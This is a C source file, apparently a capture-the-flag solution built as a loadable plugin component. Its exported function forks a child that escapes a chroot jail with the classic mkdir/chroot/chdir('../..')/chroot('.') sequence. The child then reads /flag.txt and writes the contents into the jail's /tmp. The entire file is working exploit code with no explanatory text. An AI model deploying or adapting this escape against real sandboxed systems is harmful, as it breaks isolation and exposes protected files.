
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

static void escape_and_read(int jail_tmp_fd)
{
    if (mkdir("/.escape", 0755) != 0 && errno != EEXIST)
        _exit(1);
    if (chroot("/.escape") != 0)
        _exit(1);
    if (chdir("../../../../../../..") != 0)
        _exit(1);
    if (chroot(".") != 0)
        _exit(1);

    int flag = open("/flag.txt", O_RDONLY);
    if (flag < 0)
        _exit(1);
    char buf[256];
    int length = (int)read(flag, buf, sizeof(buf) - 1);
    close(flag);
    if (length <= 0)
        _exit(1);

    int out = openat(jail_tmp_fd, "solve-flag.txt", O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (out < 0)
        _exit(1);
    write(out, buf, (size_t)length);
    close(out);
}

__attribute__((visibility("default"))) int component_writeInfo(void *a, void *b)
{
    (void)a;
    (void)b;
 
    int jail_tmp = open("/tmp", O_RDONLY | O_DIRECTORY);
    if (jail_tmp < 0)
        return 0;
    pid_t pid = fork();
    if (pid == 0) {
        escape_and_read(jail_tmp);
        _exit(0);
    }
    close(jail_tmp);

    if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
    return pid > 0;
}
